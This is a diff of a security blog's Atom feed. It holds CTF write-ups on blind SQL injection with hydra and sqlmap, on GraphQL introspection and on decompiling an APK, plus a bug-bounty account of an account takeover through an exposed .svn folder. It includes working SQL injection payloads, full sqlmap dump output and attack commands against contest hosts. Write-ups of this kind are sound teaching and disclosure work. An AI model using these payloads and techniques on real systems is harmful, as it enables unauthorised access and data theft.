@@ -1,260 +1,558 @@
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en"><generator uri="https://jekyllrb.com/" version="4.4.1">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" hreflang="en" /><updated>2025-08-15T11:41:56+03:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">j053’s playground</title><subtitle>CTFs, Bugbounty, Red Teaming, Pentests, Cybersecurity.</subtitle><entry><title type="html">Injector</title><link href="http://localhost:4000/posts/blind-SQLi/" rel="alternate" type="text/html" title="Injector" /><published>2025-08-11T11:04:00+03:00</published><updated>2025-08-11T11:04:00+03:00</updated><id>http://localhost:4000/posts/blind-SQLi</id><content type="html" xml:base="http://localhost:4000/posts/blind-SQLi/"><![CDATA[<p>Apologies for publishing this write-up after the CTF. The challenge creators have since taken the challenges offline, so I’ll be recreating this write-up from memory. NB: Solved using the uninted way.</p>
+
+<p>To begin, the challenge description (paraphrased) essentially stated: “Chain the vulnerabilities to obtain the flag.”</p>
+
+<p>When we visit the given link (http://52.209.211.118:6004/) we are presented with a login page.</p>
+
+<p>I attempted multiple login bypass techniques including SQLi payloads like <code class="language-plaintext highlighter-rouge">'or 1=1-- -</code>  but each attempt resulted in a <code class="language-plaintext highlighter-rouge">Connection error.</code> message.</p>
+
+<p>After some thought, the only logical next step was to brute-force the login. Why? Because it was the last trick I had left in my toolkit. (Turns out from the official writeup, we needed to use LDAP injection for authentication bypass)</p>
+
+<p>So, I fired up <code class="language-plaintext highlighter-rouge">hydra</code>, though if you have the Pro version of Burp Suite, you could just as well use Burp Intruder.</p>
+
+<p>As you probably know, having a valid username makes the job much easier. In most web applications, there’s a good chance you’ll find a default username like <code class="language-plaintext highlighter-rouge">Administrator</code> or <code class="language-plaintext highlighter-rouge">admin</code>. In our case, I was fortunate in guessing <code class="language-plaintext highlighter-rouge">admin</code> and it worked on the first try, and the password was hidden behind five asterisks <code class="language-plaintext highlighter-rouge">*****</code>.</p>
+
+<p><img src="/assets/img/blog/image.png" alt="simulation of how hydra is used for bruteforcing Login pages" /></p>
+
+<p>With that password, I logged in as admin.</p>
+
+<p>Here, we are given an input field to change the Access ID,</p>
+
+<p><img src="/assets/img/blog/image-2.png" alt="Image Courtesy of Michael Khanda" /></p>
+
+<p><img src="/assets/img/blog/image-1.png" alt="Img Courtesy of c1ph3rbnuk " /></p>
+
+<p>After experimenting with a few payloads, including XSS and SSTI, I discovered the application was vulnerable to SQL injection. When I modified the user ID with the payload <code class="language-plaintext highlighter-rouge">'or 1=1-- -</code>, it returned an empty user ID, whereas <code class="language-plaintext highlighter-rouge">'or 1=2-- -</code> produced no change.</p>
+
+<p>Next, it was time for <code class="language-plaintext highlighter-rouge">sqlmap</code> to come to the rescue. Initially, I ran into issues with sqlmap failing to detect the backend DBMS though it eventually picked the <code class="language-plaintext highlighter-rouge">sqlite</code> database.</p>
+
+<p>I first saved the request as a req.txt file to carry with me the aythentication tokens.</p>
+
+<p><img src="/assets/img/blog/image-3.png" alt="req.txt" /></p>
+
+<p>Now using this command <code class="language-plaintext highlighter-rouge">sqlmap -r req.txt --level=5 --risk=3 --time-sec=10</code>, I was able to get the the name of the database <code class="language-plaintext highlighter-rouge">SQLite_masterdb</code></p>
+
+<p>The only thing left was to dump the secret..I however dumped everything just to see the other user we missed during <code class="language-plaintext highlighter-rouge">hydra</code> bruteforce.</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+59
+60
+61
+62
+63
+64
+65
+66
+67
+68
+69
+70
+71
+72
+73
+74
+75
+76
+77
+78
+79
+</pre></td><td class="rouge-code"><pre>➜  web sqlmap <span class="nt">-r</span> req.txt <span class="nt">-D</span> SQLite_masterdb <span class="nt">--dump</span>
+        ___
+       __H__
+ ___ ___[<span class="o">(]</span>_____ ___ ___  <span class="o">{</span>1.9.8#stable<span class="o">}</span>
+|_ -| <span class="nb">.</span> <span class="o">[(]</span>     | .<span class="s1">'| . |
+|___|_  [)]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user'</span>s responsibility to obey all applicable <span class="nb">local</span>, state and federal laws. Developers assume no liability and are not responsible <span class="k">for </span>any misuse or damage caused by this program
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> starting @ 12:13:51 /2025-08-09/
+
+<span class="o">[</span>12:13:51] <span class="o">[</span>INFO] parsing HTTP request from <span class="s1">'req.txt'</span>
+<span class="o">[</span>12:13:51] <span class="o">[</span>INFO] resuming back-end DBMS <span class="s1">'sqlite'</span>
+<span class="o">[</span>12:13:51] <span class="o">[</span>INFO] testing connection to the target URL
+got a 302 redirect to <span class="s1">'http://52.209.211.118:6003/'</span><span class="nb">.</span> Do you want to follow? <span class="o">[</span>Y/n] n
+sqlmap resumed the following injection point<span class="o">(</span>s<span class="o">)</span> from stored session:
+<span class="nt">---</span>
+Parameter: new_username <span class="o">(</span>POST<span class="o">)</span>
+    Type: time-based blind
+    Title: SQLite <span class="o">&gt;</span> 2.0 AND time-based blind <span class="o">(</span>heavy query<span class="o">)</span>
+    Payload: <span class="nv">new_username</span><span class="o">=</span>kaka<span class="s1">' AND 3133=LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2))))-- ltNL
+---
+[12:13:53] [INFO] the back-end DBMS is SQLite
+back-end DBMS: SQLite
+[12:13:53] [INFO] fetching tables for database: '</span>SQLite_masterdb<span class="s1">'
+[12:13:53] [INFO] fetching number of tables for database '</span>SQLite_masterdb<span class="s1">'
+you provided a HTTP Cookie header value, while target URL provides its own cookies within HTTP Set-Cookie header which intersect with yours. Do you want to merge them in further requests? [Y/n] y
+.............................. (done)
+[12:14:01] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions
+do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '</span><span class="nt">--time-sec</span><span class="s1">')? [Y/n] y
+2
+[12:14:12] [INFO] retrieved:
+[12:14:16] [INFO] adjusting time delay to 4 seconds due to good response times
+users
+[12:15:26] [INFO] retrieved: secrets
+[12:16:54] [INFO] retrieved: CREATE TAB
+[12:19:21] [ERROR] invalid character detected. retrying..
+[12:19:21] [WARNING] increasing time delay to 5 seconds
+LE user
+[12:21:26] [ERROR] invalid character detected. retrying..
+[12:21:26] [WARNING] increasing time delay to 6 seconds
+s (username TEXT)
+[12:25:56] [INFO] fetching entries for table '</span><span class="nb">users</span><span class="s1">'
+[12:25:56] [INFO] fetching number of entries for table '</span><span class="nb">users</span><span class="s1">' in database '</span>SQLite_masterdb<span class="s1">'
+[12:25:56] [INFO] retrieved: 2
+[12:26:05] [INFO] retrieved: admin
+[12:27:06] [INFO] retrieved: bob
+Database: &lt;current&gt;
+Table: users
+[2 entries]
++----------+
+| username |
++----------+
+| admin    |
+| bob      |
++----------+
 
+[12:27:44] [INFO] table '</span>SQLite_masterdb.users<span class="s1">' dumped to CSV file '</span>/home/j053/.local/share/sqlmap/output/52.209.211.118/dump/SQLite_masterdb/users.csv<span class="s1">'
+[12:27:44] [INFO] retrieved: CREATEpersonnel TABLE secrets (flag TEXT)
+[12:34:57] [INFO] fetching entries for table '</span>secrets<span class="s1">'
+[12:34:57] [INFO] fetching number of entries for table '</span>secrets<span class="s1">' in database '</span>SQLite_masterdb<span class="s1">'
+[12:34:57] [INFO] retrieved: 1
+[12:35:02] [INFO] retrieved: ctf{chasing_flags_injections_everywhere}
+Database: &lt;current&gt;
+Table: secrets
+[1 entry]
++------------------------------------------+
+| flag                                     |
++------------------------------------------+
+| ctf{chasing_flags_injections_everywhere} |
++------------------------------------------+
 
-<feed xmlns="http://www.w3.org/2005/Atom">
-  <id>http://localhost:4000/</id>
-  <title>JosephKimiri's Blog</title>
-  <subtitle>My name is Joseph Kimiri, a passionate individual immersed in the world of cybersecurity. As a CTF player, I thrive in the challenge of hacking, defending, and analyzing computer systems and networks. With a bug bounty hunter mindset, I actively seek out vulnerabilities in software, websites, and applications, helping organizations strengthen their security posture. Armed with my expertise in penetration testing, I conduct thorough assessments, pinpointing weaknesses and providing recommendations for fortifying defenses. In the realm of cybersecurity, I am a relentless protector of digital assets, dedicated to ensuring safety and preserving integrity.</subtitle>
-  <updated>2024-11-12T18:11:50+03:00</updated>
-  <author>
-    <name>Joseph Kimiri</name>
-    <uri>http://localhost:4000/</uri>
-  </author>
-  <link rel="self" type="application/atom+xml" href="http://localhost:4000/feed.xml"/>
-  <link rel="alternate" type="text/html" hreflang="en"
-    href="http://localhost:4000/"/>
-  <generator uri="https://jekyllrb.com/" version="4.3.4">Jekyll</generator>
-  <rights> © 2024 Joseph Kimiri </rights>
-  <icon>/assets/img/favicons/favicon.ico</icon>
-  <logo>/assets/img/favicons/favicon-96x96.png</logo>
+[12:45:30] [INFO] table '</span>SQLite_masterdb.secrets<span class="s1">' dumped to CSV file '</span>/home/j053/.local/share/sqlmap/output/52.209.211.118/dump/SQLite_masterdb/secrets.csv<span class="s1">'
+[12:45:30] [INFO] fetched data logged to text files under '</span>/home/j053/.local/share/sqlmap/output/52.209.211.118<span class="s1">'
 
+[*] ending @ 12:45:30 /2025-08-09/
 
-  
-  <entry>
-    <title>Exploiting exposed SVN folder for Account Takeover</title>
-    <link href="http://localhost:4000/posts/svn/" rel="alternate" type="text/html" title="Exploiting exposed SVN folder for Account Takeover" />
-    <published>2024-03-17T21:11:00+03:00</published>
-  
-    <updated>2024-03-17T21:11:00+03:00</updated>
-  
-    <id>http://localhost:4000/posts/svn/</id>
-    <content src="http://localhost:4000/posts/svn/" />
-    <author>
-      <name>josephkimiri</name>
-    </author>
-
-  
-    
-    <category term="Bugbounty" />
-    
-    <category term="Web" />
-    
-  
+➜
+</span></pre></td></tr></tbody></table></code></pre></div></div>
 
-  
-    <summary>
-      
+<p>That was it. I was happy to have blooded the challenge..cheers to the author, I got the 3k plus airtime…thanks Chasingflags for the awesome CTF.</p>]]></content><author><name>j053</name></author><category term="writeups" /><category term="Web" /><category term="Chasing Flags Arise CTF" /><category term="ctfs" /><category term="Blind SQLi" /><summary type="html"><![CDATA[Apologies for publishing this write-up after the CTF. The challenge creators have since taken the challenges offline, so I’ll be recreating this write-up from memory. NB: Solved using the uninted way. To begin, the challenge description (paraphrased) essentially stated: “Chain the vulnerabilities to obtain the flag.” When we visit the given link (http://52.209.211.118:6004/) we are presented with a login page. I attempted multiple login bypass techniques including SQLi payloads like 'or 1=1-- - but each attempt resulted in a Connection error. message. After some thought, the only logical next step was to brute-force the login. Why? Because it was the last trick I had left in my toolkit. (Turns out from the official writeup, we needed to use LDAP injection for authentication bypass) So, I fired up hydra, though if you have the Pro version of Burp Suite, you could just as well use Burp Intruder. As you probably know, having a valid username makes the job much easier. In most web applications, there’s a good chance you’ll find a default username like Administrator or admin. In our case, I was fortunate in guessing admin and it worked on the first try, and the password was hidden behind five asterisks *****. With that password, I logged in as admin. Here, we are given an input field to change the Access ID, After experimenting with a few payloads, including XSS and SSTI, I discovered the application was vulnerable to SQL injection. When I modified the user ID with the payload 'or 1=1-- -, it returned an empty user ID, whereas 'or 1=2-- - produced no change. Next, it was time for sqlmap to come to the rescue. Initially, I ran into issues with sqlmap failing to detect the backend DBMS though it eventually picked the sqlite database. I first saved the request as a req.txt file to carry with me the aythentication tokens. Now using this command sqlmap -r req.txt --level=5 --risk=3 --time-sec=10, I was able to get the the name of the database SQLite_masterdb The only thing left was to dump the secret..I however dumped everything just to see the other user we missed during hydra bruteforce. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 ➜ web sqlmap -r req.txt -D SQLite_masterdb --dump ___ __H__ ___ ___[(]_____ ___ ___ {1.9.8#stable} |_ -| . [(] | .'| . | |___|_ [)]_|_|_|__,| _| |_|V... |_| https://sqlmap.org [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program [*] starting @ 12:13:51 /2025-08-09/ [12:13:51] [INFO] parsing HTTP request from 'req.txt' [12:13:51] [INFO] resuming back-end DBMS 'sqlite' [12:13:51] [INFO] testing connection to the target URL got a 302 redirect to 'http://52.209.211.118:6003/'. Do you want to follow? [Y/n] n sqlmap resumed the following injection point(s) from stored session: --- Parameter: new_username (POST) Type: time-based blind Title: SQLite &gt; 2.0 AND time-based blind (heavy query) Payload: new_username=kaka' AND 3133=LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2))))-- ltNL --- [12:13:53] [INFO] the back-end DBMS is SQLite back-end DBMS: SQLite [12:13:53] [INFO] fetching tables for database: 'SQLite_masterdb' [12:13:53] [INFO] fetching number of tables for database 'SQLite_masterdb' you provided a HTTP Cookie header value, while target URL provides its own cookies within HTTP Set-Cookie header which intersect with yours. Do you want to merge them in further requests? [Y/n] y .............................. (done) [12:14:01] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] y 2 [12:14:12] [INFO] retrieved: [12:14:16] [INFO] adjusting time delay to 4 seconds due to good response times users [12:15:26] [INFO] retrieved: secrets [12:16:54] [INFO] retrieved: CREATE TAB [12:19:21] [ERROR] invalid character detected. retrying.. [12:19:21] [WARNING] increasing time delay to 5 seconds LE user [12:21:26] [ERROR] invalid character detected. retrying.. [12:21:26] [WARNING] increasing time delay to 6 seconds s (username TEXT) [12:25:56] [INFO] fetching entries for table 'users' [12:25:56] [INFO] fetching number of entries for table 'users' in database 'SQLite_masterdb' [12:25:56] [INFO] retrieved: 2 [12:26:05] [INFO] retrieved: admin [12:27:06] [INFO] retrieved: bob Database: &lt;current&gt; Table: users [2 entries] +----------+ | username | +----------+ | admin | | bob | +----------+ [12:27:44] [INFO] table 'SQLite_masterdb.users' dumped to CSV file '/home/j053/.local/share/sqlmap/output/52.209.211.118/dump/SQLite_masterdb/users.csv' [12:27:44] [INFO] retrieved: CREATEpersonnel TABLE secrets (flag TEXT) [12:34:57] [INFO] fetching entries for table 'secrets' [12:34:57] [INFO] fetching number of entries for table 'secrets' in database 'SQLite_masterdb' [12:34:57] [INFO] retrieved: 1 [12:35:02] [INFO] retrieved: ctf{chasing_flags_injections_everywhere} Database: &lt;current&gt; Table: secrets [1 entry] +------------------------------------------+ | flag | +------------------------------------------+ | ctf{chasing_flags_injections_everywhere} | +------------------------------------------+ [12:45:30] [INFO] table 'SQLite_masterdb.secrets' dumped to CSV file '/home/j053/.local/share/sqlmap/output/52.209.211.118/dump/SQLite_masterdb/secrets.csv' [12:45:30] [INFO] fetched data logged to text files under '/home/j053/.local/share/sqlmap/output/52.209.211.118' [*] ending @ 12:45:30 /2025-08-09/ ➜ That was it. I was happy to have blooded the challenge..cheers to the author, I got the 3k plus airtime…thanks Chasingflags for the awesome CTF.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/blog/arise.png" /><media:content medium="image" url="http://localhost:4000/assets/img/blog/arise.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Exploiting exposed SVN folder for Account Takeover</title><link href="http://localhost:4000/posts/svn/" rel="alternate" type="text/html" title="Exploiting exposed SVN folder for Account Takeover" /><published>2024-03-17T21:11:00+03:00</published><updated>2024-03-17T21:11:00+03:00</updated><id>http://localhost:4000/posts/svn</id><content type="html" xml:base="http://localhost:4000/posts/svn/"><![CDATA[<h1 id="unveiling-the-consequences-of-subversion-disclosure--a-tale-of-account-takeover">Unveiling the Consequences of Subversion Disclosure : A Tale of Account TAkeover</h1>
 
+<h2 id="what-is-subversion">What is Subversion?</h2>
+<p><img src="https://gist.github.com/assets/98275198/071eb41b-b213-4a48-a7ee-95826e8cb693" alt="image" /></p>
 
+<p>Subversion, often referred to as SVN, is a centralized version control system that was initially released in 2000. It is developed and maintained by the web server software platform Apache. Unlike Git, which operates on a distributed model, SVN functions as a centralized system and is also open source.</p>
 
+<h3 id="key-features-of-svn">Key Features of SVN:</h3>
 
+<ul>
+  <li>Utilizes a central repository to securely house code alterations and preserve all iterations of a project.</li>
+  <li>Requires developers to check out code from the central repository, make modifications, and subsequently check their changes back into the repository.</li>
+  <li>Provides comprehensive directory versioning, versioned metadata (properties), consistent data management, and enables contributor management for controlling revision access.</li>
+</ul>
 
-      Unveiling the Consequences of Subversion Disclosure : A Tale of Account TAkeover
+<p>Subversion shares similarities with an earlier version control system called Concurrent Versions System (CVS), albeit with enhancements. SVN is noted for its improved speed and expanded feature set compared to CVS.</p>
 
-What is Subversion?
+<h2 id="now-to-the-interesting-part">Now to the interesting part….</h2>
 
+<p>Recently, I embarked on an exploration that led me to a misconfigured instance of Subversion (SVN) lurking at <code class="language-plaintext highlighter-rouge">https://example.com/.svn/</code>. What ensued was a journey that underscored the critical importance of robust security practices and the potential consequences of overlooking seemingly innocuous flaws.</p>
 
-Subversion, often referred to as SVN, is a centralized version control system that was initially released in 2000. It is developed and maintained by the web server software platform Apache. Unlike Git, which operates on a distributed model, SVN functions as a centralized system and is also op...
-    </summary>
-  
+<h2 id="the-discovery">The Discovery</h2>
 
-  </entry>
+<p>While conducting routine reconnaissance, my attention was drawn to <code class="language-plaintext highlighter-rouge">https://example.com/.svn/</code>, a seemingly innocuous directory. Upon further investigation, I discovered that it exposed the entire source code repository of the website. This misconfiguration left the proverbial keys to the kingdom dangling in plain sight, inviting exploitation.</p>
 
-  
-  <entry>
-    <title>Multilingual</title>
-    <link href="http://localhost:4000/posts/multilingual/" rel="alternate" type="text/html" title="Multilingual" />
-    <published>2023-09-23T22:27:00+03:00</published>
-  
-    <updated>2023-09-23T23:11:33+03:00</updated>
-  
-    <id>http://localhost:4000/posts/multilingual/</id>
-    <content src="http://localhost:4000/posts/multilingual/" />
-    <author>
-      <name>josephkimiri</name>
-    </author>
+<p>To find endpoints, I normally fuzz my targets with my to go tools like <code class="language-plaintext highlighter-rouge">ffuf</code>, <code class="language-plaintext highlighter-rouge">dirb</code> and other good tools hand in hand with a good wordlist to find hidden parameters.</p>
 
-  
-    
-    <category term="CTFs" />
-    
-    <category term="Web" />
-    
-  
+<p>Today, I did not fuzz but rather used a web extension to find the <code class="language-plaintext highlighter-rouge">.svn</code> endpoint. Use the folloeing link to <a href="https://chromewebstore.google.com/detail/dotgit/pampamgoihgcedonnphgehgondkhikel">download</a> the extension.</p>
 
-  
-    <summary>
-      
+<p><img src="https://gist.github.com/assets/98275198/7fc0742f-976f-4eb9-a614-23602412b6d7" alt="image" /></p>
 
+<h2 id="exploiting-the-vulnerability">Exploiting the Vulnerability</h2>
 
+<p>Now, that I had found the misconfigured instance, what next?</p>
 
+<p>I headed over to google to try find other blogs and security reports about how exposed <code class="language-plaintext highlighter-rouge">.svn</code> folders can be used to reconstruct the source code of the applications.</p>
 
+<p>I ended up landing on an open source <a href="https://github.com/anantshri/svn-extractor">tool</a> that helped me download the entire source code of my target.</p>
 
-      SheHacks Intervarsity CTF
+<p>With access to the source code repository, I began sifting through the codebase, scouring for potential vulnerabilities. To my dismay, I stumbled upon a treasure trove of security oversights. Nestled within the code were hardcoded credentials for accessing the admin portal—a glaring oversight with profound implications.</p>
 
-Over the weekend, I had the opportunity of attending the Intervarsity CTF organized by Shehacks Kenya 
-whith my school’s CTF team @Dumb1d0r3♾️🟰♾️
+<p><img src="https://gist.github.com/assets/98275198/636fa89f-c89d-4b3e-9a1a-e00328dc6154" alt="image" /></p>
 
+<h2 id="the-admin-portal-takeover">The Admin Portal Takeover</h2>
 
-I and my team solved some few challenges and we had fun playing and learning.
+<p>Armed with the newfound credentials, I infiltrated the admin portal with ease, gaining unrestricted access to sensitive data and critical functionalities. What I uncovered was deeply troubling: the admin portal exposed personally identifiable information (PII) of users, posing a significant privacy risk. Moreover, lax security measures enabled me to reroute payments and manipulate transactions with ease.</p>
 
-I’ll take you through some of the challenges we solved.
+<p><img src="https://gist.github.com/assets/98275198/6518601e-76d3-4b51-ab78-a05b390cec90" alt="image" /></p>
 
-Android
-Multilingual
-The first challenge was called Multilingual and was pretty easy.
-...
-    </summary>
-  
+<p>I was able to access the accounts balance and change the payment details of the account.</p>
 
-  </entry>
+<p><img src="https://gist.github.com/assets/98275198/6b321930-0046-45ca-ae2e-f4bb2c24426c" alt="image" /></p>
 
-  
-  <entry>
-    <title>Secured Notes</title>
-    <link href="http://localhost:4000/posts/Secured-Notes/" rel="alternate" type="text/html" title="Secured Notes" />
-    <published>2023-09-23T22:27:00+03:00</published>
-  
-    <updated>2023-09-23T22:27:00+03:00</updated>
-  
-    <id>http://localhost:4000/posts/Secured-Notes/</id>
-    <content src="http://localhost:4000/posts/Secured-Notes/" />
-    <author>
-      <name>josephkimiri</name>
-    </author>
+<h2 id="responsible-disclosure">Responsible Disclosure</h2>
 
-  
-    
-    <category term="CTFs" />
-    
-    <category term="Web" />
-    
-  
+<p><strong>Disclaimer:</strong> Before proceeding with any actions, it’s essential to note that responsible disclosure was adhered to throughout this process. The vulnerabilities discovered were promptly reported to the appropriate team, allowing for remediation measures to be implemented.</p>
 
-  
-    <summary>
-      
+<h2 id="the-implications">The Implications</h2>
 
+<p>The ramifications of this discovery were profound. The misconfigured instance of SVN served as a gateway to a cascade of security vulnerabilities, culminating in the compromise of the admin portal and the exposure of sensitive PII. This sobering revelation underscores the critical importance of robust security protocols and proactive vulnerability management.</p>
 
+<h2 id="lessons-learned">Lessons Learned</h2>
 
+<h3 id="1-vigilance-is-key">1. Vigilance is Key</h3>
 
+<p>Remain vigilant and conduct thorough assessments of all aspects of your digital infrastructure, including seemingly innocuous directories like <code class="language-plaintext highlighter-rouge">.svn</code>.</p>
 
-      Secured Notes
-I created an application to retrieve my secrets. Is it realy secured?
-SecuredNotes.apk
+<h3 id="2-practice-secure-coding">2. Practice Secure Coding</h3>
 
-Solution
-Here, we were given an apkfile and we were tasked into finding whether the app was handling secrets well. 
-I decompiled the app using apktool using the command apktool d SecuredNotes.apk
+<p>Avoid hardcoded credentials and prioritize secure coding practices to mitigate the risk of inadvertent exposure.</p>
 
+<h3 id="3-implement-defense-in-depth">3. Implement Defense-in-Depth</h3>
 
+<p>Adopt a defense-in-depth approach to cybersecurity, layering multiple security measures to mitigate the impact of potential breaches. i.e If the system had implemented MFA, even with valid creds I would not have succeeded logging in.</p>
 
-I then went into the folder containing the application and grepped for the key words secret &amp;amp...
-    </summary>
-  
+<h2 id="conclusion">Conclusion</h2>
 
-  </entry>
+<p>The journey from discovery to exploitation of the misconfigured SVN instance served as a stark reminder of the ever-present threats lurking in the digital landscape. By remaining vigilant, practicing secure coding, and implementing robust security measures, organizations can safeguard against the perils of subversion and fortify their defenses against cyber threats.</p>
 
-  
-  <entry>
-    <title>Graph1</title>
-    <link href="http://localhost:4000/posts/Graph1/" rel="alternate" type="text/html" title="Graph1" />
-    <published>2023-09-23T22:27:00+03:00</published>
-  
-    <updated>2023-09-23T22:27:00+03:00</updated>
-  
-    <id>http://localhost:4000/posts/Graph1/</id>
-    <content src="http://localhost:4000/posts/Graph1/" />
-    <author>
-      <name>josephkimiri</name>
-    </author>
+<p>Let this case study serve as a beacon of awareness, illuminating the path toward a more secure digital future.</p>
 
-  
-    
-    <category term="CTFs" />
-    
-    <category term="Web" />
-    
-  
+<p>Stay tuned for further insights and explorations into the evolving realm of cybersecurity.</p>]]></content><author><name>Joseph Kimiri</name></author><category term="Bugbounty" /><category term="Web" /><category term="Bugbounty" /><category term="cybersecurity" /><summary type="html"><![CDATA[Unveiling the Consequences of Subversion Disclosure : A Tale of Account TAkeover]]></summary></entry><entry><title type="html">Graph1</title><link href="http://localhost:4000/posts/Graph1/" rel="alternate" type="text/html" title="Graph1" /><published>2023-09-23T22:27:00+03:00</published><updated>2023-09-23T22:27:00+03:00</updated><id>http://localhost:4000/posts/Graph1</id><content type="html" xml:base="http://localhost:4000/posts/Graph1/"><![CDATA[<h2 id="web">Web</h2>
 
-  
-    <summary>
-      
+<p>For the web challenges, I solved one challenge by the name <em>Graph1</em>.</p>
 
+<h2 id="graph1">Graph1</h2>
+<p>We are given a <a href="http://128.199.47.43:5000/">link</a> and told to find the flag.</p>
 
+<p>I was happy I had an opportunity to learn how graphql works. You can learn more about graphql testing <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/graphql">here</a></p>
 
+<p>We start by visiting the link and we get the following page that says graphql is running.</p>
 
+<p><img src="https://user-images.githubusercontent.com/98275198/270128295-b0b1a413-3130-40eb-9660-88270b791d51.png" alt="image" /></p>
 
-      Web
+<p>Playing with the graphql api, we got interesting responses.</p>
 
-For the web challenges, I solved one challenge by the name Graph1.
+<p><img src="https://user-images.githubusercontent.com/98275198/270128489-30a159bd-e450-4a2f-a660-58f055632b1b.png" alt="image" /></p>
 
-Graph1
-We are given a link and told to find the flag.
+<p>I then went ahead to dump the schema using the following query: <code class="language-plaintext highlighter-rouge">query={__schema{types{name,fields{name}}}}</code> We got the following schema returned.</p>
 
-I was happy I had an opportunity to learn how graphql works. You can learn more about graphql testing here
+<p><img src="https://user-images.githubusercontent.com/98275198/270128626-6f18e3d4-0034-4301-9816-c5410cbcc152.png" alt="image" /></p>
 
-We start by visiting the link and we get the following page that says graphql is running.
+<p>Great, Now we craft a curl command to get us our flag.</p>
 
+<p>The command looks like <code class="language-plaintext highlighter-rouge">curl -X POST -H "Content-Type: application/json" -d '{"query":"{getFlag{id flag}}"}' http://128.199.47.43:5000/graphql</code></p>
 
+<p><img src="https://user-images.githubusercontent.com/98275198/270128744-87c83d0d-521a-4295-97f6-73f3b32c269a.png" alt="image" /></p>
 
-Playing with the graphql api, we got interesting responses.
+<p>This inturn gives us the flag encoded in base64.
+Decoding the base64 string, we get our flag.</p>
 
+<p><img src="https://user-images.githubusercontent.com/98275198/270128807-a4037061-d8d5-48fe-9c93-33c7776de9e3.png" alt="image" /></p>]]></content><author><name>Joseph Kimiri</name></author><category term="CTFs" /><category term="Web" /><category term="SheHacks Intervarsity CTF" /><category term="web-security" /><category term="APIs" /><summary type="html"><![CDATA[Web]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/blog/graph1.png" /><media:content medium="image" url="http://localhost:4000/assets/img/blog/graph1.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Secured Notes</title><link href="http://localhost:4000/posts/Secured-Notes/" rel="alternate" type="text/html" title="Secured Notes" /><published>2023-09-23T22:27:00+03:00</published><updated>2023-09-23T22:27:00+03:00</updated><id>http://localhost:4000/posts/Secured-Notes</id><content type="html" xml:base="http://localhost:4000/posts/Secured-Notes/"><![CDATA[<h2 id="secured-notes">Secured Notes</h2>
+<p><em>I created an application to retrieve my secrets. Is it realy secured?</em>
+<a href="https://shehacks.ciphercode.dev/files/eb87b76700359036b1bc6ae2ad7f01da/SecuredNotes.apk?token=eyJ1c2VyX2lkIjoxMCwidGVhbV9pZCI6NywiZmlsZV9pZCI6MTF9.ZQ8vSQ.NzsB7kKBpwgGlfyBS368JHpKAxE">SecuredNotes.apk</a></p>
 
+<h2 id="solution">Solution</h2>
+<p>Here, we were given an apkfile and we were tasked into finding whether the app was handling secrets well. 
+I decompiled the app using <code class="language-plaintext highlighter-rouge">apktool</code> using the command <code class="language-plaintext highlighter-rouge">apktool d SecuredNotes.apk</code></p>
 
-I the...
-    </summary>
-  
+<p><img src="https://user-images.githubusercontent.com/98275198/270125873-5035f2a0-cf44-4fc8-a3a4-342fd5cf7289.png" alt="image" /></p>
 
-  </entry>
+<p>I then went into the folder containing the application and grepped for the key words <strong>secret</strong> &amp; <strong>flag</strong></p>
 
-  
-  <entry>
-    <title>Pico CTF (ReadMyCert)</title>
-    <link href="http://localhost:4000/posts/readmycert/" rel="alternate" type="text/html" title="Pico CTF (ReadMyCert)" />
-    <published>2023-05-14T18:33:00+03:00</published>
-  
-    <updated>2023-05-14T18:33:00+03:00</updated>
-  
-    <id>http://localhost:4000/posts/readmycert/</id>
-    <content src="http://localhost:4000/posts/readmycert/" />
-    <author>
-      <name>josephkimiri</name>
-    </author>
+<p><img src="https://user-images.githubusercontent.com/98275198/270125976-dcdec05f-c4d7-4607-89d5-895e1b8cd3d6.png" alt="image" /></p>
 
-  
-    
-    <category term="CTFs" />
-    
-    <category term="Cryptography" />
-    
-  
+<p>We get a base64 like string <code class="language-plaintext highlighter-rouge">DQkYFA8aWxkBCFUdQBAtHB8XWgseACtGXgURNBZKEAZBGxgY</code>, but after decoding it we realize it is messed up somehow.</p>
 
-  
-    <summary>
-      
+<p><img src="https://user-images.githubusercontent.com/98275198/270126074-c1674a58-3fda-4ae2-8ed6-f8b6f32c83c3.png" alt="image" /></p>
 
+<p>We then grep for <code class="language-plaintext highlighter-rouge">secret</code> and we immediately get a hit.</p>
 
